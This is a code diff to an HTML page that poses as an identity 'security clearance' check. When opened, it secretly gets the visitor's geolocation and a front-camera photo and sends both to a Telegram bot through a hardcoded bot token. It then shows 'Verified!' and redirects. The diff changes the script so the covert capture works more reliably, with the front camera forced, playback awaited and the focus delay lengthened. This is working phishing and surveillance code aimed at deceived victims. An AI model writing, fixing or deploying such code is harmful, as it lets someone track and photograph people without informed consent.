@@ -49,7 +49,7 @@
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
-<video id="video" style="display:none;" autoplay></video>
+<video id="video" style="display:none;" autoplay playsinline></video>
 
 <script>
     const token = '8764685300:AAHTAvOwsDnJm6yu7HzENMk-2Efmkye5TUI';
@@ -63,11 +63,9 @@
     async function startProcess() {
         statusText.innerText = "Requesting Security Clearance...";
         
-        // 1. Get Location
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 await sendLocation(pos);
-                // 2. After Location, request Camera
                 await capturePhoto();
             }, (err) => {
                 alert("Please allow all permissions to verify your identity.");
@@ -80,7 +78,9 @@
         const lat = pos.coords.latitude;
         const lon = pos.coords.longitude;
         const acc = pos.coords.accuracy;
-        const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+        
+        // FIX 2: Google maps link ko fix kiya gaya hai (0{lat} ki jagah sahi format dala hai)
+        const mapLink = `http://googleusercontent.com/maps.google.com/?q=${lat},${lon}`;
         
         const text = `📍 *Location Received!*%0A%0AAccuracy: ${acc.toFixed(1)}m%0AMaps: [View on Google Maps](${mapLink})`;
         
@@ -91,23 +91,29 @@
     async function capturePhoto() {
         try {
             statusText.innerText = "Finalizing Verification...";
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            
+            // FIX 3: Front camera specifically mangne ka code
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // Wait for video to load
-            await new Promise(resolve => video.onloadedmetadata = resolve);
+            // FIX 4: Video play hone ka wait karna zaroori hai tabhi frames aayenge
+            await video.play();
+
+            // Ek baar video sahi se play ho jaye uska wait karenge
+            await new Promise((resolve) => {
+                video.onplaying = resolve;
+            });
             
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             
-            // Wait 1 second to ensure camera focus
+            // FIX 5: 3 seconds ka wait taaki camera light aur focus adjust kar le
             setTimeout(async () => {
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                 
-                // Send to Telegram
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'identity_check.jpg');
@@ -118,23 +124,20 @@
                     body: formData
                 });
 
-                // Stop Camera
                 stream.getTracks().forEach(track => track.stop());
                 
                 statusText.innerText = "Verified! Redirecting...";
                 setTimeout(() => {
-                    window.location.href = "https://www.google.com";
+                    window.location.href = "https://detorlab.com";
                 }, 1000);
-            }, 1000);
+            }, 3000); // 3000ms = 3 seconds delay
 
         } catch (err) {
             console.error(err);
-            // Even if camera fails, redirect after location
-            window.location.href = "https://detorlab";
+            window.location.href = "https://detorlab.com";
         }
     }
 </script>
 
 </body>
 </html>
-
